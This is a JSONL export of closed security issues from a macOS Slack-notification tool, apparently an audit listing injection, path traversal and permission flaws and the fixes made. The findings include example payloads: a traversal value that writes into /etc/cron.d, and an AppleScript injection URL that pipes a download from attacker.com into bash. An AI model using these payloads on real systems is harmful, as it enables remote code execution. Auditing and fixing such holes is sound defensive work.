{"id":"csn-1t3","title":"MEDIUM: Path traversal in instance file","description":"INSTANCE_ID from CLAUDE_INSTANCE_ID env var is used directly in file path in bin/claude-slack-notify:10-12.\n\n**Risk**: Setting CLAUDE_INSTANCE_ID=../../etc/cron.d/pwn could write files outside the intended directory.\n\n**Fix**: Validate that INSTANCE_ID contains only alphanumeric characters: [[ \"$INSTANCE_ID\" =~ ^[a-zA-Z0-9_-]+$ ]]","status":"closed","priority":1,"issue_type":"bug","owner":"0x@liqhtworks.xyz","created_at":"2026-01-18T14:58:50.51356-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:06:03.449249-08:00","closed_at":"2026-01-18T15:06:03.449249-08:00","close_reason":"Added INSTANCE_ID validation in bin/claude-slack-notify using regex ^[a-zA-Z0-9_-]+$ to only allow alphanumeric, underscore, and hyphen characters. Path traversal attempts (../, dots) are rejected with exit 1."}
{"id":"csn-2p3","title":"HIGH: AppleScript injection in focus-helper","description":"User-controlled values from claude-focus:// URLs are embedded directly into AppleScript without sanitization in bin/focus-helper:34-52 and 63-80.\n\n**Risk**: Attacker can craft URLs with AppleScript escape sequences to execute arbitrary shell commands.\n\n**Example**: claude-focus://iterm2/\"; do shell script \"curl attacker.com/pwn|bash\"; return \"\n\n**Fix**: Sanitize URL params before embedding in AppleScript, or pass values via environment variables.","status":"closed","priority":0,"issue_type":"bug","owner":"0x@liqhtworks.xyz","created_at":"2026-01-18T14:58:34.920487-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:03:57.59462-08:00","closed_at":"2026-01-18T15:03:57.59462-08:00","close_reason":"Added sanitize_applescript() function in bin/focus-helper that validates inputs against a strict allowlist regex (alphanumeric, dash, underscore, dot, slash, colon, equals). Invalid inputs are rejected with exit 1 before reaching AppleScript. Tested with injection attempts - all blocked."}
{"id":"csn-355","title":"LOW: Debug log disclosure in focus-helper","description":"Debug logging in bin/focus-helper:6,19,31 etc. writes to /tmp/focus-debug.log which is world-readable.\n\n**Risk**: Exposes terminal session information, TTY paths, and session IDs to other local users.\n\n**Fix**: Log to ~/.claude/logs/ with proper permissions, or remove debug logging in production.","status":"closed","priority":2,"issue_type":"bug","owner":"0x@liqhtworks.xyz","created_at":"2026-01-18T14:58:55.689117-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:10:25.3345-08:00","closed_at":"2026-01-18T15:10:25.3345-08:00","close_reason":"Moved debug log from world-readable /tmp/focus-debug.log to ~/.claude/logs/focus-debug.log. Directory is created with chmod 700 permissions. All 10 log statements updated to use the secure location."}
{"id":"csn-5bn","title":"MEDIUM: JSON injection in Slack message","description":"User input from $1 (MESSAGE) and $2 (INSTANCE_NAME) is embedded directly into JSON in bin/claude-slack-notify:226-244.\n\n**Risk**: If message contains quotes or backslashes, it could break JSON structure or inject fields.\n\n**Fix**: Use jq to safely construct JSON: jq -n --arg msg \"$MESSAGE\" '{text: $msg}'","status":"closed","priority":1,"issue_type":"bug","owner":"0x@liqhtworks.xyz","created_at":"2026-01-18T14:58:45.948203-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:07:28.913223-08:00","closed_at":"2026-01-18T15:07:28.913223-08:00","close_reason":"Added json_escape() function that properly escapes backslashes, double quotes, newlines, carriage returns, and tabs. All user-controllable values (INSTANCE_NAME, HOSTNAME, LOCATION, MESSAGE, FOCUS_URL) are now escaped before JSON embedding. Verified with Python json.load() that output is valid JSON."}
{"id":"csn-90m","title":"LOW: Incomplete URL encoding function","description":"The url_encode function in bin/claude-slack-notify:18-20 only encodes /, :, and .\n\n**Risk**: Characters like \u0026, #, ?, spaces are not encoded, potentially breaking URLs.\n\n**Fix**: Use a proper URL encoding function or: python3 -c \"import urllib.parse; print(urllib.parse.quote('$1'))\"","status":"closed","priority":2,"issue_type":"bug","owner":"0x@liqhtworks.xyz","created_at":"2026-01-18T14:59:00.944669-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:09:45.144677-08:00","closed_at":"2026-01-18T15:09:45.144677-08:00","close_reason":"Replaced simple sed-based url_encode with proper implementation that encodes all non-alphanumeric chars except -_.~. Updated url_decode in focus-helper to use printf '%b' for proper hex decoding. Both functions now handle spaces, \u0026, #, ?, and other special characters correctly."}
{"id":"csn-sp5","title":"Include task context in Slack notifications","description":"Currently notifications just say 'Task completed after Xs' without context about what was done. Should include the last action/message so users know what to expect when they return.","status":"closed","priority":1,"issue_type":"feature","owner":"0x@liqhtworks.xyz","created_at":"2026-01-18T15:12:38.341975-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:16:25.612087-08:00","closed_at":"2026-01-18T15:16:25.612087-08:00","close_reason":"Added context parameter to start/check commands. PreToolUse hooks now store context (Running command, Editing files, Running agent, Reading files). Notification shows 'Finished: \u003ccontext\u003e (Xs)' instead of generic message."}
{"id":"csn-wiw","title":"HIGH: World-writable IPC via /tmp file","description":"The LaunchAgent in install.sh:68-87 polls /tmp/claude-focus-request which any local user can write to. The ClaudeFocus.app also writes to this file (lines 95-97).\n\n**Risk**: Any local user/process can inject malicious URLs to trigger AppleScript execution in your context.\n\n**Fix**: Use a user-specific path ($TMPDIR or ~/.claude/) with proper permissions (0600).","status":"closed","priority":0,"issue_type":"bug","owner":"0x@liqhtworks.xyz","created_at":"2026-01-18T14:58:40.66507-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:05:01.165795-08:00","closed_at":"2026-01-18T15:05:01.165795-08:00","close_reason":"Changed IPC file from world-writable /tmp/claude-focus-request to user-owned ~/.claude/focus-request. AppleScript now uses 'umask 077' to create the file with 0600 permissions. LaunchAgent updated to read from the same secure location."}
